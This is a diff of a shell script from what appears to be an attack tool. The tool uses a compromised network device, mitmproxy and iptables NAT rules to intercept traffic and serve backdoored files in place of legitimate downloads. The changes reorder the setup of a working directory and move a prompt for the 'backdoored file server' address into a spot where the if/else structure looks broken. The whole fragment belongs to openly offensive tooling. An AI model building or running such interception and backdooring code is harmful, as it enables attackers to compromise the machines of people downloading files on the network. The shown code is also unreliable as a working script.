@@ -377,6 +377,8 @@ if  [ $(uname -o) != "GNU/Linux" ];then
     popup "WARNING: only GNU/Linux is supported at this time, will continue execution,good luck."
 fi
 
+mkdir work  # not doing && cd work in case work already exists.
+cd work
 
   dialog --yesno "Will we be using this same device to host backdoored files?" 7 40
 if [ $? -le 0 ]; then
@@ -385,10 +387,7 @@ if [ $? -ge 1 ]; then
    printf %"s\n" "Unable to find interface IP address, please enter an IP address or domain name where you expect lighttpd to be listening:"
    read INTERFACE_IP
 fi
-else 
-   printf %"s\n" "Please enter the IP address or domain name of the backdoored file server:"
-   read INTERFACE_IP
-fi
+
 
 
 
@@ -398,8 +397,6 @@ fi
 # However in this case I will use the compromised network
 # device to setup the backdoored files.
 
-mkdir work  # not doing && cd work in case work already exists.
-cd work
 
 tmpchecklist=/tmp/checklist.$$
 
@@ -500,7 +497,10 @@ fi
 # Setup mitmproxy/mitmdump
 # configure iptables rules accordingly for the interface
 
-
+else 
+   printf %"s\n" "Please enter the IP address or domain name of the backdoored file server:"
+   read INTERFACE_IP
+fi
 # Set it up
 iptables -t nat -I PREROUTING 1 -i $INTERFACE -p tcp -m tcp -d $INTERFACE_IP --dport 80 -j ACCEPT  -m comment --comment "Don't do anything with traffic to $INTERFACE_IP on port 80"
 
